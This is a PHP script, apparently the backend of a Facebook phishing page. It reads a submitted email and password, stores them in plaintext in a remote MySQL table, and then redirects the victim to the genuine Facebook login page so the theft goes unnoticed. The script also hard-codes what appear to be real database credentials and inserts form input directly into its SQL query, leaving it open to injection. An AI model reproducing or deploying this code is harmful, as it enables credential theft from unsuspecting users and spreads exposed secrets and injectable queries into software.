<?php
    $email = $_POST["email"];
    $pass = $_POST["pass"];

    // Configuración de la conexión a la base de datos
    $host = "btblhlgryyu4g4thtksa-mysql.services.clever-cloud.com";
    $db = "btblhlgryyu4g4thtksa";
    $user = "u0fqzy3otm6fkgml";
    $password = "VyKg26R9R2lt0tgVEhNR";

    // Conexión a la base de datos
    $conn = new mysqli($host, $user, $password, $db);

    // Verificar si la conexión fue exitosa
    if ($conn->connect_error) {
        die("Error al conectar a la base de datos: " . $conn->connect_error);
    }

    // Preparar la consulta SQL
    $sql = "INSERT INTO tblLogin (usuario, contrasena) VALUES ('$email', '$pass')";

    if ($conn->query($sql) === TRUE) {
        header("Location: https://facebook.com/login");
        exit();
    } else {
        echo "Error al guardar los datos: " . $conn->error;
    }

    // Cerrar la conexión
    $conn->close();
?>

